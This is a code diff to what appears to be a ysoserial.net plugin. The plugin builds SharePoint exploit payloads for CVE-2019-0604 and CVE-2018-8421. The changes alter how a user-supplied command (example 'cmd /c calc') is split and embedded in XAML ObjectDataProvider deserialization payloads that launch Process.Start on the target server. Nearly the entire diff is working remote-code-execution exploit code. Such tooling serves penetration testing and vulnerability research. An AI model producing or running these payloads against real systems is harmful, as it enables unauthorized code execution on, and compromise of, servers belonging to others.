@@ -22,11 +22,12 @@ namespace ysoserial.Plugins
         static string cve = "";
         static string file = "";
         static string cmd = "";
+        static Boolean minify = false;
 
         static OptionSet options = new OptionSet()
             {
                 {"cve=", "the CVE reference: CVE-2019-0604, CVE-2018-8421", v => cve = v },
-                {"c|command=", "the command to be executed", v => cmd = v },
+                {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => cmd = v },
             };
 
         public string Name()
@@ -104,6 +105,20 @@ namespace ysoserial.Plugins
 
         public string CVE_2018_8421()
         {
+            Boolean hasArgs;
+            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+            String cmdPart;
+
+            if (hasArgs)
+            {
+                cmdPart = $@"<Diag:ProcessStartInfo FileName="""+ splittedCMD[0]+ @""" Arguments=""" + splittedCMD[1] + @""">";
+            }
+            else
+            {
+                cmdPart = $@"<Diag:ProcessStartInfo FileName=""" + splittedCMD[0] + @""">";
+            }
+
             string payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
 <SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
@@ -114,13 +129,15 @@ Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Rd=""c
 Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,    
 PublicKeyToken=31bf3856ad364e35"">
 <ODP:ObjectDataProvider x:Key=""LaunchCmd"" MethodName=""Start"">
-<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo><Diag:ProcessStartInfo FileName=""cmd.exe"" Arguments=""/c " + cmd + @""" ></Diag:ProcessStartInfo></Diag:Process.StartInfo></Diag:Process>
+<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>"+ cmdPart + @"</Diag:ProcessStartInfo></Diag:Process.StartInfo></Diag:Process>
 </ObjectDataProvider.ObjectInstance>
 </ODP:ObjectDataProvider>
 </Rd:ResourceDictionary>
 </SequentialWorkflowActivity>
 ]]></workflowMarkupText>
 <rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";
+
+            // minimisation of payload is not important here but we can do it if needed!
 
             return payload;
         }
@@ -129,27 +146,43 @@ PublicKeyToken=31bf3856ad364e35"">
         private static char[] hexChars = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
         public string CVE_2019_0604()
         {
-            string payload = @"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
+            Boolean hasArgs;
+            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+            String cmdPart;
+
+            if (hasArgs)
+            {
+                cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+            }
+            else
+            {
+                cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+            }
+
+            string payloadPart1 = @"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:";
+            
+            /*
+            string payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
         <ExpandedElement/>
         <ProjectedProperty0>
             <MethodName>Parse</MethodName>
             <MethodParameters>
                 <anyType xsi:type=""xsd:string"">
-                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
-                        &lt;ObjectDataProvider x:Key=&quot;&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;
-                            &lt;ObjectDataProvider.MethodParameters&gt;
-                                &lt;System:String&gt;cmd&lt;/System:String&gt;
-                                &lt;System:String&gt;/c " + cmd + @"&lt;/System:String&gt;
-                            &lt;/ObjectDataProvider.MethodParameters&gt;
-                        &lt;/ObjectDataProvider&gt;
-                    &lt;/ResourceDictionary&gt;
+                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">"+ cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                 </anyType>
             </MethodParameters>
             <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
         </ProjectedProperty0>
     </ExpandedWrapperOfXamlReaderObjectDataProvider>";
-            payload = PayloadMinifier(payload); // we need to make it smaller as goes bigger after encoding
-            //Console.WriteLine(payload);
+            //*/
+
+            string payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://www.w3.org/2001/XMLSchema""><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType a:type=""b:string""><![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]></anyType></MethodParameters><ObjectInstance a:type=""XamlReader""/></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>";
+
+            payloadPart2 = PayloadMinifier(payloadPart2); // we need to make it smaller as goes bigger after encoding
+
+            //Console.WriteLine(payloadPart2);
+            string payload = payloadPart1 + payloadPart2;
 
             StringBuilder stringBuilder = new StringBuilder();
 
